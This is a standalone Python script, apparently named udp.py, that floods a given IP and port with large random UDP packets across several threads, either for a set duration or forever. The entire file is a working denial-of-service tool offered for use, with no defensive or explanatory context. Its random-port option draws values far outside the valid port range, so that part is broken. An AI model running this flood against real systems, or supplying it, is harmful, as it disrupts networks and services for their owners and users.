#!/usr/bin/python3
import socket
import random
import sys
import time
import threading

if len(sys.argv) == 1:
    sys.exit('Usage: udp.py ip port(0=random) length(0=forever) threads')

def UDPFlood(thread_id):
    port = int(sys.argv[2])
    randport = (True, False)[port == 0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    clock = (lambda: 0, time.perf_counter)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    print(f'Thread-{thread_id} ZxC-UDP: {ip}:{port} for {dur or "infinite"} seconds')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(65500)
    while True:
        port = (random.randint(1, 15000000), port)[randport]
        if clock() < duration:
            sock.sendto(bytes_data, (ip, port))
        else:
            break
    print(f'Thread-{thread_id} DONE')

def main():
    num_threads = int(sys.argv[4])
    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=UDPFlood, args=(i,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
